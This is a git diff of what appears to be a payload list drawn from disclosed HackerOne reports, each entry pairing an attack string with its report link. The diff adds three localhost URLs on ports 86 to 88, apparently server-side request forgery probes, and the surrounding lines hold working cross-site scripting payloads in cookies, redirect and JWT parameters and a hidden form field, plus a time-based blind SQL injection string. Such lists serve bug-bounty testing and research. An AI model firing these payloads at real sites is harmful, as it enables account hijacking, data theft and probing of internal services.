@@ -1125,6 +1125,9 @@ Set-Cookie: yelpmainpaastacanary=asdf guvo=</script><script>alert(1)</script>; D
 Set-Cookie: yelpmainpaastacanary=asdf guvo=</script><script>alert(1)</script>; Max-Age=99999999; Domain=.target.com; Path=/; Secure; SameSite=Lax	https://hackerone.com/reports/2010530
 https://target.com/webview/v1/refresh-jwt?redirect=%22%3E%3Cimg%20src=faw%20onerror=alert(1	https://hackerone.com/reports/2014955
 https://target.com/webview/v1?phone=████████&token=██████████&service=cargo&locale=en&jwt=%22%3E%3Cimg%20src=raw%20onerror=alert(%22hackerone%22	https://hackerone.com/reports/2015074
+https://127.0.0.1:86	https://hackerone.com/reports/2015554
+https://127.0.0.1:88	https://hackerone.com/reports/2015554
+https://127.0.0.1:87	https://hackerone.com/reports/2015554
 https:/██████/0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z => 15.896	https://hackerone.com/reports/2020429
 https://target.com/webview/v1/transport-change?phone=██████&token=█████████&service=intercity3&jwt=fw%22%3E%3Cimg%20src=fwa%20onerror=alert(1	https://hackerone.com/reports/2028265
 <input type="hidden" name="apellido" value="<script>alert()</script>" />	https://hackerone.com/reports/2037234
